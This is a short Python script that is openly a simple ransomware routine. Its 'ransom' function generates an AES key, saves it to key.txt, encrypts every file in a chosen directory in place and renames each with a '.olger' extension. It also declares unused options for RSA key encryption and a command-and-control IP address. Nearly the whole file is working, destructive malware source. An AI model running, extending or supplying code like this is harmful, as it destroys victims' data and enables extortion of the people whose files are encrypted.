from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
from Crypto.Random import get_random_bytes
import os, argparse, logging, sys

logging.basicConfig(level=logging.INFO, stream=sys.stderr, format='%(asctime)s %(name)s %(levelname)s: %(message)s')
log = logging.getLogger()

parser = argparse.ArgumentParser()
parser.add_argument("path", help = "Path to encrypt files, full path\n")
parser.add_argument("--encrypt-key", help ="encrypt the key with RSA\n")
parser.add_argument ("--c2", help = "IP address for C2\n")
args = parser.parse_args()

#changing extensions and che/ck if it is already changed
def ext_change(file):
	file = file
	if file.endswith('.olger'):
		pass
	else: 
		log.info('changing extension for %s', file)
		extension = os.path.splitext(file)[0]
		os.rename(file,extension + '.olger')

def ransom(path):
	path = path
	#creating the key save the key in a file in base64, just for testing purposes
	key = get_random_bytes(16)
	key_b64 = base64.b64encode(key)
	log.info('Saving key in txt file')
	cipher = AES.new(key, AES.MODE_ECB)
	file = open('key.txt', "w")
	n = file.write(str(key_b64))
	file.close()
	#hardcoded path, change it for testing purposes
	try:
		files_to_encrypt = os.listdir(path)
		full_path = path
		
		#Routine for encryption
		for x in files_to_encrypt:
			if x.endswith("olger"):
				log.info('found file with olger extension %s', x)
			else:
				log.info('Starting to encrypt files with AES')
				log.info('Encrypting file %s',full_path+x)
				encrypt_file = open(full_path+x, "rb+")
				data = encrypt_file.read()
				encrypt_file.seek(0)
				encrypt_file.write((base64.b64encode(cipher.encrypt(pad(data, 16)))))
				encrypt_file.write(b'\n')
				encrypt_file.close()
				ext_change(full_path+x)
	except FileNotFoundError:
		exit()

def main():
	if args.path:
		ransom(args.path)

if __name__ == '__main__':
	main()